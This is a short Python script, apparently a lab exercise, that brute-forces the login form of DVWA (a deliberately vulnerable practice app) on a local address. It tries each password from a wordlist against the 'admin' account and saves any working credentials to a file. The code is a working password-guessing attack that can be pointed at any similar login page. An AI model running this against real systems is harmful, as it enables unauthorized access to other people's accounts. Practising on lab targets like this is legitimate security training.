import mechanicalsoup

site = 'http://192.168.1.9/dvwa/login.php'
user = 'admin'

browser = mechanicalsoup.StatefulBrowser()
browser.open(site)

caminho_arquivo = './fasttrack.txt'

with open(caminho_arquivo, 'r') as arquivo:
    lista_passwords = arquivo.readlines()

def busca_vulnerabilidade():
    for password in lista_passwords:
        password = password.strip()
        browser.select_form('form[action="login.php"]')  
        browser["username"] = user
        browser["password"] = password
        resposta_site = browser.submit_selected()

        resposta_site = browser.get_url()
        if resposta_site != site:
            print(f'''
                  -----------------------------------
                  Foi encontrada uma vulnerabilidade!
                  Acessou com a senha {password}
                  -----------------------------------''')
            with open ('credenciais.txt', 'a') as credenciais:
                credenciais.write(f'{user}:{password}\n')
            break
        else:
            print(f'''
                  A senha {password} não é correta!
                  ''')

busca_vulnerabilidade()
